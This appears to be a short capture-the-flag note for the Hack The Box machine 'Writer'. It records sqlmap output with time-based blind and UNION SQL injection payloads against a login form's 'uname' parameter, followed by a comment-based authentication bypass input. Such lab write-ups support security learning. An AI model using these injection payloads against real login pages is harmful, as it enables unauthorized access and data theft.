## Info 
### Credentiak 
 User | Password | Service | Note
------|----------|---------|------
kyle  |          |         |

### HTTP
- domain: `Writer.HTB`
- login page: `/administrative`

## Path
### User
1. Found `/administrative` has SQL Injection.
```
sqlmap identified the following injection point(s) with a total of 90 HTTP(s) requests:
---
Parameter: uname (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: uname=admin' AND (SELECT 3785 FROM (SELECT(SLEEP(5)))wVdK) AND 'vekP'='vekP&password=admin

    Type: UNION query
    Title: Generic UNION query (NULL) - 6 columns
    Payload: uname=admin' UNION ALL SELECT NULL,CONCAT(0x71766a7171,0x647273715a44645a656a444341676c59677353484f4d4c6370686a614b634c4a6356496c44476c5a,0x716b766271),NULL,NULL,NULL,NULL-- -&password=admin
---
[16:14:36] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 20.04 or 19.10 (focal or eoan)
web application technology: Apache 2.4.41
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
```
2. Use SQL Injection to login as `admin`.
```
uname=admin'-- -&password=admin
```
